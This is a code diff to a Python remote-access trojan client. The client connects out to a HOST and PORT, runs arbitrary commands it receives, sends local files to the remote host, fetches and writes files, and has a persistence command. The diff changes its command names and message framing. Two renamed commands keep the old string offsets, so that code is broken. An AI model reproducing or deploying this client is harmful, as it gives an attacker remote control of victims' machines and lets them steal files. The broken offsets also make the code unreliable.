@@ -22,12 +22,8 @@ def Upload(sock, file):
     f = open(file, 'rb')
   except IOError:
     return 'Error opening file'
-  d = f.read(1024)
-  while(d):
-    sock.send(d)
-    d = f.read(1024)
-  time.sleep(1)
-  Send(sock, '')
+  d = f.read()
+  Send(sock, d + 'FILENAMEXXX%sFILEXXXEODXXX' % file)
   f.close()
   return 'File sent 🍺'
 
@@ -97,11 +93,10 @@ while True:
     sock.connect((HOST, PORT))
 
     data = Receive(sock)
-    print(data)
 
     if data == 'activate':
       active = True
-      Send(sock, os.getcwd() + '>')
+      Send(sock, os.getcwd() + '>EODXXX')
 
     while active:
       ret = ''
@@ -118,13 +113,13 @@ while True:
         except:
           ret = 'Error changing directory.\n'
 
-      elif data.startswith('download '):
-        ret = Upload(sock, data[9:])
+      elif data.startswith('dl '):
+        ret = Upload(sock, data[3:])
 
-      elif data.startswith('downhttp '):
+      elif data.startswith('dlhttp '):
         ret = Downhttp(sock, data[9:])
 
-      elif data.startswith('upload '):
+      elif data.startswith('ul '):
         ret = Download(sock, data[7:])
 
       elif data.startswith('persist '):
@@ -139,7 +134,7 @@ while True:
       else:
         ret = run(data)
 
-      ret = ret + '\n' + os.getcwd() + '>'
+      ret = ret + '\n' + os.getcwd() + '>EODXXX'
       Send(sock, ret)
   except socket.error:
     sock.close()
